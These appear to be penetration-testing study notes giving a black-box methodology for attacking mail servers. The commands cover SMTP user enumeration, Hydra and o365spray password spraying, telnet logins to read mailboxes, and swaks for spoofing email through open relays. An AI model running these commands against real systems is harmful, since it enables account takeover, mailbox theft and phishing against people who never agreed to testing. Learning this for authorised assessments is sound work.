## **SMTP User Enumeration (`smtp-user-enum`)**

**Syntax:** 
```
smtp-user-enum -M <mode> -U <user_file> -D <domain> -t <target_ip>
```

---

**Arguments:**

- **`-M`**: Enumeration mode (**VRFY**, **EXPN**, or **RCPT**).
    
- **`-U`**: Path to the file containing the **user list**.
    
- **`-D`**: The **domain** name (required by some servers/modes).
    
- **`-t`**: The **target** IP address or hostname.
    

> **Note:** Use `VRFY` first as it's the most common method, but switch to `RCPT` if the server is configured to reject verification requests.

## Password Attacks
#### Hydra - Password Attack
- If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`
```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

## Protocol Specifics Attacks

- An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay.
- Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

#### Open Relay

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email.
- With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
```
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

## Mail Server Black-Box Methodology

### Phase 1 — Reconnaissance

**DNS Enumeration** (before touching the target)

```bash
# Find mail servers
dig mx target.com | grep -v ";"
host -t MX target.com

# Resolve mail server IPs
host -t A mail1.target.com
dig A mail1.target.com
```

**Port Scan**

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <target_ip>
```

Look for: which protocols are open (SMTP/POP3/IMAP and their TLS variants), software versions, and banners.

---

### Phase 2 — User Enumeration

**SMTP-based** (try in this order):

```bash
# VRFY first
smtp-user-enum -M VRFY -U users.txt -D target.com -t <ip>

# Fall back to EXPN or RCPT if VRFY is disabled
smtp-user-enum -M RCPT -U users.txt -D target.com -t <ip>
```

**Cloud (O365) targets:**


```bash
python3 o365spray.py --validate --domain target.com
python3 o365spray.py --enum -U users.txt --domain target.com
```

---

### Phase 3 — Password Attacks

Once you have a user list:


````bash
# Generic (POP3/IMAP/SMTP)
hydra -L users.txt -P rockyou.txt -f <ip> imap
hydra -L users.txt -P rockyou.txt -f <ip> pop3
hydra -L users.txt -P rockyou.txt -f <ip> smtp

# O365
python3 o365spray.py --spray -U users.txt -p 'Password123' --count 1 --lockout 1 --domain target.com
```

> **Tip:** For corporate targets, try seasonal passwords first (`March2024!`, `Company01!`) before pulling out rockyou — it's faster and avoids lockouts.

---

### Phase 4 — Post-Auth Mailbox Access

Once you have valid creds, connect manually and read mail:

**IMAP (port 143):**
```
telnet <ip> 143
a1 login user@target.com password
a2 LIST "" "*"            # list all mailboxes
a3 SELECT INBOX
a4 FETCH 1 BODY[]         # read first email
a5 FETCH 1:* FLAGS        # list all emails and their flags
```

**POP3 (port 110):**
```
telnet <ip> 110
USER user@target.com
PASS password
LIST                      # list messages
RETR 1                    # read message 1
````

Look for: credentials in emails, internal hostnames, password reset emails, sensitive data.

---

### Phase 5 — Misconfiguration Checks

**Open Relay:**

````bash
nmap -p25 -Pn --script smtp-open-relay <ip>

# Exploit for phishing/spoofing if found
swaks --from spoofed@target.com --to victim@target.com \
  --header 'Subject: Test' --body 'message' --server <ip>
```

### Decision Tree (Quick Reference)
```
Ports open?
├── 25/587 → SMTP → enumerate users → password spray
├── 110/995 → POP3 → login with found creds → read mail
└── 143/993 → IMAP → login with found creds → read mail

Cloud target (O365)?
└── o365spray for both enum + spray

Open relay found?
└── swaks for spoofed phishing emails
````
